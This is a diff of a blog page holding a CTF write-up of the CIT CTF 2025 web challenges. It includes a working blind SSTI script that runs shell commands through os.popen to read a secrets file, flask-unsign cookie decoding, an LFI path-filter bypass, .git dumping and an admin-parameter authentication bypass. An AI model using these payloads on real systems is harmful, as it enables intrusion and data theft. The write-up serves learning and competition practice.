-</span></span></code></pre></div><h2 id=how-i-parsed-your-json>How I Parsed your JSON<a hidden class=anchor aria-hidden=true href=#how-i-parsed-your-json>#</a></h2><p>This challenge reads JSON files locally and provides a SQL-like syntax to extract data. You can add <code>*</code> to the query to extract all columns.</p><p>The useful finding was converting the <code>container</code> parameter into a list with <code>?container[]=</code>. This showed a debug page with source code.</p><p><img alt="Debug Page" loading=lazy src=https://miro.medium.com/v2/resize:fit:667/1*HpShJFda_vKXHxW6UGpBfA.png></p><p>The code simply removes <code>../</code> and file extensions from the container name to prevent LFI. This can be bypassed with <code>..//file.txt.txt</code>.</p><pre tabindex=0><code>/select?record=*&amp;container=../../../..//app//secrets.txt.txt
-</code></pre><p><img alt="LFI Bypass Result" loading=lazy src=https://miro.medium.com/v2/resize:fit:667/1*KhKFV2iS03LRGP23UU74KA.png></p><h2 id=commit--order-version-control-unit>Commit & Order: Version Control Unit<a hidden class=anchor aria-hidden=true href=#commit--order-version-control-unit>#</a></h2><p>This challenge was straightforward. I discovered an exposed <code>/.git</code> directory on the server and dumped the repository using the git-dump tool.</p><p>After examining the commit history, I found older commits that contained the source code with hardcoded admin credentials. This is a common security mistake where developers remove sensitive information in later commits but forget that the data remains accessible in the Git history.</p><p>The steps to solve were:</p><ol><li>Identify the exposed Git repository at <code>/.git</code></li><li>Download the repository using git-dump</li><li>Review commit history with <code>git log</code></li><li>Check older commits with <code>git show [commit-hash]</code></li><li>Find the source code file containing the hardcoded admin password in admin.php</li><li>Use the credentials to access the admin panel and retrieve the flag</li></ol><h2 id=breaking-authentication>Breaking Authentication<a hidden class=anchor aria-hidden=true href=#breaking-authentication>#</a></h2><p>This challenge featured a straightforward SQL injection vulnerability in the login page.</p><p>Steps to solve:</p><ol><li>Accessed the database and dumped its contents</li><li>Found the flag stored in the &lsquo;secrets&rsquo; table</li></ol><p>Classic example of an unsanitized input field allowing SQL injection to compromise a web application&rsquo;s authentication mechanism.</p><h2 id=keeping-up-with-the-credentials>Keeping Up with the Credentials<a hidden class=anchor aria-hidden=true href=#keeping-up-with-the-credentials>#</a></h2><p>This challenge required first solving another challenge to obtain valid username and password credentials.</p><p>Steps to solve:</p><ol><li>Used credentials obtained from the previous challenge to log in</li><li>After login, got redirected to <code>/debug.php</code> which was an empty page</li><li>Noticed that accessing <code>/admin.php</code> directly would automatically log you out</li><li>Modified the login request to include the parameter <code>admin=true</code> using POST method</li><li>Successfully redirected to <code>/admin.php</code> with admin privileges</li><li>Retrieved the flag from the admin page</li></ol><p>Pretty Simple :v</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://www.mindpatch.net/tags/ctf/>CTF</a></li><li><a href=https://www.mindpatch.net/tags/web-security/>Web Security</a></li><li><a href=https://www.mindpatch.net/tags/ssti/>SSTI</a></li><li><a href=https://www.mindpatch.net/tags/lfi/>LFI</a></li><li><a href=https://www.mindpatch.net/tags/sql-injection/>SQL Injection</a></li><li><a href=https://www.mindpatch.net/tags/git-enumeration/>Git Enumeration</a></li><li><a href=https://www.mindpatch.net/tags/flask/>Flask</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://www.mindpatch.net/>@MindPatch</a></span> ·
-<span>Powered by
-<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
-<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
-</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
+
+    <title>
+        
+            [CIT CTF 2025] Solving all Web challenges :: @MindPatch 
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="/main.min.07ea7ac7da67e2e153a7dfa2457bc6a19cca824288d175e223fadc579041bc51.css" integrity="sha256-B&#43;p6x9pn4uFTp9&#43;iRXvGoZzKgkKI0XXiI/rcV5BBvFE=" crossorigin="anonymous">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="[CIT CTF 2025] Solving all Web challenges">
+  <meta itemprop="description" content="Hello, I joined the CTF for fun during the weekend.
+I focused on web challenges and completed all challenges in this category. The challenges were straightforward and made for a fun weekend.
+Mr. Chatbot The application shows a welcome page asking for your name, then puts you in a chat with a bot. The goal was to get the Flag from the bot. This wasn’t an LLM attack — responses came from JavaScript files.">
+  <meta itemprop="datePublished" content="2025-04-28T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-04-28T00:00:00+00:00">
+  <meta itemprop="wordCount" content="843">
+  <meta itemprop="image" content="https://www.mindpatch.net/og-image.png">
+  <meta itemprop="keywords" content="CTF,Web Security,SSTI,LFI,SQL Injection,Git Enumeration,Flask">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://www.mindpatch.net/og-image.png">
+  <meta name="twitter:title" content="[CIT CTF 2025] Solving all Web challenges">
+  <meta name="twitter:description" content="Hello, I joined the CTF for fun during the weekend.
+I focused on web challenges and completed all challenges in this category. The challenges were straightforward and made for a fun weekend.
+Mr. Chatbot The application shows a welcome page asking for your name, then puts you in a chat with a bot. The goal was to get the Flag from the bot. This wasn’t an LLM attack — responses came from JavaScript files.">
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2025-04-28 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                @MindPatch</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about">About</a></li><li><a href="/posts">Blog</a></li><li><a href="/projects/">Projects</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        4 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://www.mindpatch.net/posts/2025-04-28-cit-ctf/">[CIT CTF 2025] Solving all Web challenges</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <p>Hello, I joined the CTF for fun during the weekend.</p>
+<p>I focused on web challenges and completed all challenges in this category. The challenges were straightforward and made for a fun weekend.</p>
+<h2 id="mr-chatbot">Mr. Chatbot</h2>
+<p><img src="https://miro.medium.com/v2/resize:fit:952/1*kvW3lucpnNq6fTtQ9Y_BBA.png" alt="Mr. Chatbot Challenge"></p>
+<p>The application shows a welcome page asking for your name, then puts you in a chat with a bot. The goal was to get the Flag from the bot. This wasn&rsquo;t an LLM attack — responses came from JavaScript files.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:952/1*RXw88Zwtk6JNglc_pSVzTQ.png" alt="Chat Interface"></p>
+<p>After entering a name, you get a session value that can be decoded with flask-unsign:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ flask-unsign --unsign --cookie <span style="color:#e6db74">&#34;eyJhZG1pbiI6IjAiLCJuYW1lIjoiaGFja2VyIn0.aA8u-Q.GRwPzCvfn4k_zUDDzo_XL83fKJk&#34;</span> --secret<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;9f3IC3uj9^zZ&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Session decodes to: <span style="color:#f92672">{</span><span style="color:#e6db74">&#39;admin&#39;</span>: <span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">&#39;name&#39;</span>: <span style="color:#e6db74">&#39;hacker&#39;</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><img src="https://miro.medium.com/v2/resize:fit:952/1*lZwyPZ9_OqenlmQWuCAssg.png" alt="Session Decoding"></p>
+<p>After trying injections with no luck, I did parameter fuzzing and found the <code>admin=1</code> parameter. This revealed new session data:</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:667/1*1TuqK6xE0XGYJz-DQD50oQ.png" alt="Admin Parameter"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ flask-unsign --unsign --cookie <span style="color:#e6db74">&#34;.eJwdzE0LgjAAxvHvsksEHVoJUdEpe7M2C2S63cyJTacIFprRd--x2397ftuHxLo0FVkRSiakissUmT6TOm6aVo_G63GGO43tZTSmy0xM5XvZyoj3enarzkFjzqF-3ENRSCNz1heL6PiwzHaO7LMaXfJ956hwn6QHUVzQfqDQrL3SbjpYTmFzL0ndguKc822NfUe5Haz2omPWMfpvGJsrtAoEzMmBNwpOuXZ4M4d1fAEb_v-be4b1ftBsyPcHZ6hN0g.aAwwvA.ouiTuVJ131_fQmyqYgewMTM-ZlM&#34;</span> --secret<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;9f3IC3uj9^zZ&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Session decodes to: <span style="color:#f92672">{</span><span style="color:#e6db74">&#39;admin&#39;</span>: <span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">&#39;name&#39;</span>: <span style="color:#e6db74">&#34;hacker&#34;</span>, <span style="color:#e6db74">&#39;uid&#39;</span>: <span style="color:#e6db74">&#39;L2V0Yy9wYXNzd2QnKTsiKWdhbWVkYiYjMzk7XHhlMlx4YzgpXHhmNFx4ZWFceGVkLFx4OTZceGMwP1x0XHhlN1x4YjJceDk1XHhjNCpceGE1Nlx4OTdJXHgxM1x4OTdceDljZ1x4ZTVceGI4XHhiZlx4ZDlceGE3XHg4OVx4OWJceDk3JiMzOTs=&#39;</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>As you see there&rsquo;s a new variable (<strong>UID</strong>), I tried doing some injections like SSTI and got it :)</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:667/1*GdcyUtROwNfXlDF7_ViIVw.png" alt="SSTI Success"></p>
+<p>Well The idea now to get <strong>secrets.txt</strong> file blindly, I wrote a script that uses <strong>head</strong> command if char is valid then sleep 5 seconds</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CHARS <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>printable
+</span></span><span style="display:flex;"><span>FOUND <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>POSITION <span style="color:#f92672">=</span> len(FOUND) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_payload</span>(position, the_char):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Use a simple command to compare single character</span>
+</span></span><span style="display:flex;"><span>    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[ &#34;$(head -c </span><span style="color:#e6db74">{</span>position<span style="color:#e6db74">}</span><span style="color:#e6db74"> secrets.txt | tail -c 1)&#34; = &#34;</span><span style="color:#e6db74">{</span>the_char<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; ] &amp;&amp; sleep 5&#39;</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{{ self.__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;&#34;</span><span style="color:#f92672">+</span>cmd<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#39;).read() }}&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> FOUND, POSITION
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Continue until we&#39;ve found enough characters or need to stop</span>
+</span></span><span style="display:flex;"><span>    max_positions <span style="color:#f92672">=</span> <span style="color:#ae81ff">100</span>  <span style="color:#75715e"># Set a reasonable limit</span>
+</span></span><span style="display:flex;"><span>    consecutive_spaces <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>  <span style="color:#75715e"># Track consecutive spaces to detect end of file</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> POSITION <span style="color:#f92672">&lt;=</span> max_positions <span style="color:#f92672">and</span> consecutive_spaces <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">5</span>:  <span style="color:#75715e"># Stop after 5 consecutive spaces</span>
+</span></span><span style="display:flex;"><span>        found_char <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ch <span style="color:#f92672">in</span> CHARS:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ch <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;`&#39;</span>, <span style="color:#e6db74">&#39;$&#39;</span>, <span style="color:#e6db74">&#39;&amp;&#39;</span>, <span style="color:#e6db74">&#39;|&#39;</span>, <span style="color:#e6db74">&#39;;&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#39;</span>]:  <span style="color:#75715e"># Skip problematic chars</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Position </span><span style="color:#e6db74">{</span>POSITION<span style="color:#e6db74">}</span><span style="color:#e6db74">, trying character: </span><span style="color:#e6db74">{</span>ch<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            start_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;http://23.179.17.40:58005/&#34;</span>, 
+</span></span><span style="display:flex;"><span>                    allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, 
+</span></span><span style="display:flex;"><span>                    data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;name&#34;</span>: make_payload(POSITION, ch), <span style="color:#e6db74">&#34;admin&#34;</span>: <span style="color:#e6db74">&#34;1&#34;</span>},
+</span></span><span style="display:flex;"><span>                    proxies<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;http&#34;</span>: <span style="color:#e6db74">&#34;http://localhost:8080&#34;</span>},
+</span></span><span style="display:flex;"><span>                    timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>                )
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                elapsed_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time() <span style="color:#f92672">-</span> start_time
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> elapsed_time <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">4.5</span>:  <span style="color:#75715e"># Slightly lower threshold to account for network variability</span>
+</span></span><span style="display:flex;"><span>                    FOUND <span style="color:#f92672">+=</span> ch
+</span></span><span style="display:flex;"><span>                    found_char <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e"># Reset consecutive spaces counter if we found a non-space</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> ch <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39; &#39;</span>:
+</span></span><span style="display:flex;"><span>                        consecutive_spaces <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                        consecutive_spaces <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>                        
+</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Found character at position </span><span style="color:#e6db74">{</span>POSITION<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>ch<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Current secret: </span><span style="color:#e6db74">{</span>FOUND<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>Timeout:
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># If timeout occurs, the character matched</span>
+</span></span><span style="display:flex;"><span>                FOUND <span style="color:#f92672">+=</span> ch
+</span></span><span style="display:flex;"><span>                found_char <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># Reset consecutive spaces counter if we found a non-space</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> ch <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39; &#39;</span>:
+</span></span><span style="display:flex;"><span>                    consecutive_spaces <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                    consecutive_spaces <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Found character at position </span><span style="color:#e6db74">{</span>POSITION<span style="color:#e6db74">}</span><span style="color:#e6db74"> (timeout): </span><span style="color:#e6db74">{</span>ch<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Current secret: </span><span style="color:#e6db74">{</span>FOUND<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error with character </span><span style="color:#e6db74">{</span>ch<span style="color:#e6db74">}</span><span style="color:#e6db74"> at position </span><span style="color:#e6db74">{</span>POSITION<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> found_char:
+</span></span><span style="display:flex;"><span>            FOUND <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; &#34;</span>
+</span></span><span style="display:flex;"><span>            consecutive_spaces <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;No character found at position </span><span style="color:#e6db74">{</span>POSITION<span style="color:#e6db74">}</span><span style="color:#e6db74">, adding space and continuing&#34;</span>)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Current secret: </span><span style="color:#e6db74">{</span>FOUND<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Consecutive spaces: </span><span style="color:#e6db74">{</span>consecutive_spaces<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        POSITION <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Starting blind exploitation from existing credentials: </span><span style="color:#e6db74">{</span>FOUND<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Starting at position: </span><span style="color:#e6db74">{</span>POSITION<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    exploit()
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Final extracted secret: </span><span style="color:#e6db74">{</span>FOUND<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>And after running it got the flag :)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python exp.py
+</span></span><span style="display:flex;"><span>admin:9f3IC3uj9^zZ  CIT<span style="color:#f92672">{</span>18a7fbedb4f3548f<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="how-i-parsed-your-json">How I Parsed your JSON</h2>
+<p>This challenge reads JSON files locally and provides a SQL-like syntax to extract data. You can add <code>*</code> to the query to extract all columns.</p>
+<p>The useful finding was converting the <code>container</code> parameter into a list with <code>?container[]=</code>. This showed a debug page with source code.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:667/1*HpShJFda_vKXHxW6UGpBfA.png" alt="Debug Page"></p>
+<p>The code simply removes <code>../</code> and file extensions from the container name to prevent LFI. This can be bypassed with <code>..//file.txt.txt</code>.</p>
+<pre tabindex="0"><code>/select?record=*&amp;container=../../../..//app//secrets.txt.txt
+</code></pre><p><img src="https://miro.medium.com/v2/resize:fit:667/1*KhKFV2iS03LRGP23UU74KA.png" alt="LFI Bypass Result"></p>
+<h2 id="commit--order-version-control-unit">Commit &amp; Order: Version Control Unit</h2>
+<p>This challenge was straightforward. I discovered an exposed <code>/.git</code> directory on the server and dumped the repository using the git-dump tool.</p>
+<p>After examining the commit history, I found older commits that contained the source code with hardcoded admin credentials. This is a common security mistake where developers remove sensitive information in later commits but forget that the data remains accessible in the Git history.</p>
+<p>The steps to solve were:</p>
+<ol>
+<li>Identify the exposed Git repository at <code>/.git</code></li>
+<li>Download the repository using git-dump</li>
+<li>Review commit history with <code>git log</code></li>
+<li>Check older commits with <code>git show [commit-hash]</code></li>
+<li>Find the source code file containing the hardcoded admin password in admin.php</li>
+<li>Use the credentials to access the admin panel and retrieve the flag</li>
+</ol>
+<h2 id="breaking-authentication">Breaking Authentication</h2>
+<p>This challenge featured a straightforward SQL injection vulnerability in the login page.</p>
+<p>Steps to solve:</p>
+<ol>
+<li>Accessed the database and dumped its contents</li>
+<li>Found the flag stored in the &lsquo;secrets&rsquo; table</li>
+</ol>
+<p>Classic example of an unsanitized input field allowing SQL injection to compromise a web application&rsquo;s authentication mechanism.</p>
+<h2 id="keeping-up-with-the-credentials">Keeping Up with the Credentials</h2>
+<p>This challenge required first solving another challenge to obtain valid username and password credentials.</p>
+<p>Steps to solve:</p>
+<ol>
+<li>Used credentials obtained from the previous challenge to log in</li>
+<li>After login, got redirected to <code>/debug.php</code> which was an empty page</li>
+<li>Noticed that accessing <code>/admin.php</code> directly would automatically log you out</li>
+<li>Modified the login request to include the parameter <code>admin=true</code> using POST method</li>
+<li>Successfully redirected to <code>/admin.php</code> with admin privileges</li>
+<li>Retrieved the flag from the admin page</li>
+</ol>
+<p>Pretty Simple :v</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://www.mindpatch.net/tags/ctf/">CTF</a></span>
+        <span class="tag"><a href="https://www.mindpatch.net/tags/web-security/">web security</a></span>
+        <span class="tag"><a href="https://www.mindpatch.net/tags/ssti/">SSTI</a></span>
+        <span class="tag"><a href="https://www.mindpatch.net/tags/lfi/">LFI</a></span>
+        <span class="tag"><a href="https://www.mindpatch.net/tags/sql-injection/">SQL injection</a></span>
+        <span class="tag"><a href="https://www.mindpatch.net/tags/git-enumeration/">git enumeration</a></span>
+        <span class="tag"><a href="https://www.mindpatch.net/tags/flask/">flask</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
